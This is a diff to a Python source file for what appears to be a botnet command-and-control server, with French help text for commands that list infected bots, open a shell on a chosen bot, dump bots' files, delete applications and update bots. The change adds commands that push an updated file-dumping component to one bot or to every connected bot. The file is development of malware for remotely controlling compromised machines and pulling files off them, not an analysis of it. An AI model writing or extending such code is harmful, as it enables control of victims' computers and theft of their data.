@@ -59,7 +59,6 @@ class Myserver():
         while True:
             try:
                 if self.stop_server:
-                    continue1 = False
                     self.end()
                     break
                 sc, addr = self.sock.accept()
@@ -95,6 +94,8 @@ class Myserver():
                         print "list : pour avoir la liste des bots connecter\n"
                         print "switch : pour avoir un shell vers un autre bot de la liste, il faut entrer une ip parmi la liste des bots disponibles\n"
                         print "dump : Faire un dump de fichiers du bot courant.\n"
+                        print "update_dumper : Faire une mise à jour du fichier de dump dans le bot courant.\n"
+                        print "update_dumper_all : Faire une mise à jour du fichier de dump pour tous les bots.\n"
                         print "dumpall : Faire un dump de fichiers de tous les bots connectés.\n"
                         print "delete Nom_application : Supprimer une application à partir de son nom.\n"
                         print "update : Mis-à jou du bot à partir du nouveau.\n"
@@ -114,6 +115,16 @@ class Myserver():
                         for bot  in self.bots.values():
                             if not bot.isclosed():
                                 bot.dump()
+                    elif command == 'update_dumper_all':
+                        print '[*] Starting update file dumper for all bots\n'
+                        for bot in self.bots.values():
+                            if not bot.isclosed():
+                                bot.update_dumper()
+                    elif command == 'update_dumper':
+                        print '[*] Starting update file dumper for courant bot\n'
+                        for bot in self.bots.values():
+                            if bot.get_channel() == self.chan:
+                                bot.update_dumper()
                     elif 'deconnect' in command:
                         ChannelSSH.sendToChannel(command, self.chan)
                         for bot in self.bots.values():
